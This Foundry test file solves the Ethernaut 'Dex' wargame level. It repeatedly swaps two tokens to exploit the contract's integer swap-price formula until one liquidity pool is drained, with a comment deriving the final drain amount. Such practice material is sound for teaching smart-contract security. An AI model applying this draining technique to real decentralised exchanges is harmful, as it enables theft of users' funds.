// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/22-Dex/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 2 ether);
    }

    function testDex() public {
        // Level Setup
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));
        address token1 = ethernautDex.token1();
        address token2 = ethernautDex.token2();
        uint balanceToken1 = ethernautDex.balanceOf(token1, playerAddress);
        uint balanceToken2 = ethernautDex.balanceOf(token2, playerAddress);

        // Level Attack
        uint liquidity; // To keep track of the DEx token liquidity
        uint price;     // To compare Dex price with liquidity

        ethernautDex.approve(address(ethernautDex), type(uint).max);
        ethernautDex.swap(token1, token2, balanceToken1);

        while (true) {
            balanceToken1 = ethernautDex.balanceOf(token1, playerAddress);
            balanceToken2 = ethernautDex.balanceOf(token2, playerAddress);
            emit log_named_uint("Token1 Balance", balanceToken1);
            emit log_named_uint("Token2 Balance", balanceToken2);
            emit log("");

            /* swapPrice from Dex contract = amountFrom * balanceTo / balanceFrom
            We need swapPrice == balanceTo, then => balanceTo = amountFrom * balanceTo / balanceFrom
            so, amountFrom = balanceFrom
            */
            if (balanceToken1 == 0) {
                price = ethernautDex.getSwapPrice(token2, token1, balanceToken2);
                liquidity = ethernautDex.balanceOf(token1, address(ethernautDex));
                if (price > liquidity) {
                    // Final swap
                    ethernautDex.swap(token2, token1, ethernautDex.balanceOf(token2, address(ethernautDex)));
                    break;
                } else {
                    ethernautDex.swap(token2, token1, balanceToken2);
                }
            } else {
                price = ethernautDex.getSwapPrice(token1, token2, balanceToken2);
                liquidity = ethernautDex.balanceOf(token2, address(ethernautDex));
                if (price > liquidity) {
                    // Final swap
                    ethernautDex.swap(token1, token2, ethernautDex.balanceOf(token1, address(ethernautDex)));
                    break;
                } else {
                    ethernautDex.swap(token1, token2, balanceToken1);
                }
            }
        }

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
